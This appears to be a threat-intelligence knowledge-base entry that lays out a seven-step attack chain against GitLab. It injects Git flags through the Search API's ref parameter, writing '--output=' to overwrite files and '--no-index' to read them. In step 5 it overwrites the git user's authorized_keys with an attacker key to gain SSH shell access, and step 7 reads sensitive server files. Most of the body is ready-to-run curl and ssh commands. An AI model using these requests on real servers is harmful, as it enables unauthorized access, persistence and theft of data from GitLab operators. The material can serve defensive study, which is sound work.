---
tags:
  - gitlab
  - command-injection
  - file-overwrite
  - rce
  - ssh
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/git]]'
  - '[[tools/ssh]]'
  - '[[tools/cat]]'
  - '[[tools/GitLab-Wiki]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Persistence]]'
commands:
  - '[[commands/curl-gitlab-search-wiki-blobs]]'
  - '[[commands/cat-file-contents]]'
  - '[[commands/ssh-gitlab-access]]'
  - '[[commands/id-user-check]]'
  - '[[commands/cat-authorized-keys]]'
  - '[[commands/curl-gitlab-search-blobs]]'
platforms:
  - Linux
  - GitLab
complexity: medium
procedures:
  - '[[procedures/Create-Wiki-Page-with-Controlled-Commit]]'
  - '[[procedures/Inject-Git-Flag-via-Search-API]]'
  - '[[procedures/Verify-File-Overwrite]]'
  - '[[procedures/Generate-SSH-Key-Pair]]'
  - '[[procedures/Overwrite-Authorized-Keys-via-API]]'
  - '[[procedures/Establish-SSH-Access]]'
  - '[[procedures/Exploit-Blobs-Scope-for-File-Read]]'
step_count: 7
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[tools/ssh]]'
description: >-
  Exploitation of Git flag injection in GitLab's Search API to overwrite files
  and achieve RCE via SSH
skill_level: intermediate
impact_level: high
id: 3565a337-b5cf-411d-a3f9-4d32b3ea8057
created_at: '2025-12-11T06:10:30.014Z'
updated_at: '2025-12-11T06:10:30.014Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
  - '[[T1021.004]]'
---
# GitLab Git Flag Injection Leading to File Overwrite and Remote Code Execution

Multi-stage attack chain exploiting a command injection vulnerability in GitLab's Search API to inject Git flags, overwrite local files with controlled content from commit messages, and achieve remote code execution as the git user via SSH access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Controlled Commit] --> B[Inject Flag to Overwrite File]
    B --> C[Verify Overwrite]
    C --> D[Generate SSH Key]
    D --> E[Overwrite Authorized Keys]
    E --> F[SSH Access]
    F --> G[File Read Exploit]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#e74c3c
    style E fill:#f39c12
    style F fill:#3498db
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/ssh]]
- [[tools/git]]
- [[tools/cat]]
- [[tools/GitLab-Wiki]]

### Target Environment

- Linux (Ubuntu 16.04)
- GitLab instance with API access
- Required services: GitLab, Redis 3.2.12, Gitaly, Sidekiq, GitLab Shell 9.3.0
- Tech stack: Ruby 2.6.3, Git 2.21.0, PostgreSQL 10.7

### Initial Access Requirements

- API token for authenticated access
- Access to GitLab project with wiki enabled
- Network access to GitLab server

## Detailed Attack Procedures

### Step 1: Create Wiki Page with Controlled Commit - [[procedures/Create-Wiki-Page-with-Controlled-Commit]]

**Procedure**: [[procedures/Create-Wiki-Page-with-Controlled-Commit]]

**Objective**: Create a wiki page to embed controlled content in a commit message for later file overwrite.

**Expected Output**: A new wiki page with the specified commit message.

**Success Indicators**:
- Wiki page created successfully
- Commit message verifiable in Git history

Use the GitLab Wiki interface to create a new page named 'page' with commit message 'controlled content'.

### Step 2: Inject Git Flag via Search API - [[procedures/Inject-Git-Flag-via-Search-API]]

**Procedure**: [[procedures/Inject-Git-Flag-via-Search-API]]

**Objective**: Exploit the Search API to inject Git flags and overwrite a file with commit content.

**Expected Output**: File overwritten with git log output including controlled message.

**Success Indicators**:
- API call succeeds without errors
- Target file is created or modified

Execute [[commands/curl-gitlab-search-wiki-blobs]] to inject the flag:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

### Step 3: Verify File Overwrite - [[procedures/Verify-File-Overwrite]]

**Procedure**: [[procedures/Verify-File-Overwrite]]

**Objective**: Confirm the file has been overwritten with controlled content.

**Expected Output**: File contents match the commit message.

**Success Indicators**:
- File exists at specified path
- Contents include 'controlled content'

Use [[commands/cat-file-contents]] to check:

```bash
cat /tmp/file
```

### Step 4: Generate SSH Key Pair - [[procedures/Generate-SSH-Key-Pair]]

**Procedure**: [[procedures/Generate-SSH-Key-Pair]]

**Objective**: Create an RSA key pair for SSH access.

**Expected Output**: RSA public and private keys generated.

**Success Indicators**:
- Key files created
- Public key ready for embedding

Generate an RSA key pair using standard tools (e.g., ssh-keygen).

### Step 5: Overwrite Authorized Keys via API - [[procedures/Overwrite-Authorized-Keys-via-API]]

**Procedure**: [[procedures/Overwrite-Authorized-Keys-via-API]]

**Objective**: Overwrite the authorized_keys file with the attacker's public key via flag injection.

**Expected Output**: authorized_keys file updated with public key.

**Success Indicators**:
- API call completes
- File contents include public key

First, create a wiki page with the public key as commit message, then execute [[commands/curl-gitlab-search-wiki-blobs]]:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

### Step 6: Establish SSH Access - [[procedures/Establish-SSH-Access]]

**Procedure**: [[procedures/Establish-SSH-Access]]

**Objective**: Gain remote shell access as git user.

**Expected Output**: Successful SSH connection and shell.

**Success Indicators**:
- SSH login succeeds
- User confirmed as git via id command

Use [[commands/ssh-gitlab-access]] to connect:

```bash
ssh git@gitlab-vm.local -i gitlab
```
Then run [[commands/id-user-check]]:

```bash
id
```
And [[commands/cat-authorized-keys]]:

```bash
cat /var/opt/gitlab/.ssh/authorized_keys
```

### Step 7: Exploit Blobs Scope for File Read - [[procedures/Exploit-Blobs-Scope-for-File-Read]]

**Procedure**: [[procedures/Exploit-Blobs-Scope-for-File-Read]]

**Objective**: Read sensitive files using similar flag injection in blobs scope.

**Expected Output**: API response containing file contents like config.toml.

**Success Indicators**:
- Sensitive data exfiltrated
- No authentication errors

Execute [[commands/curl-gitlab-search-wiki-blobs]]:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

## Attack Chain Summary

### Key Achievements

1. Arbitrary file overwrite with controlled content
2. SSH access as git user leading to RCE
3. Sensitive file reads via API exploitation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]
- [[tools/ssh]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Persistence]]

*Last updated: 2023-10-01*
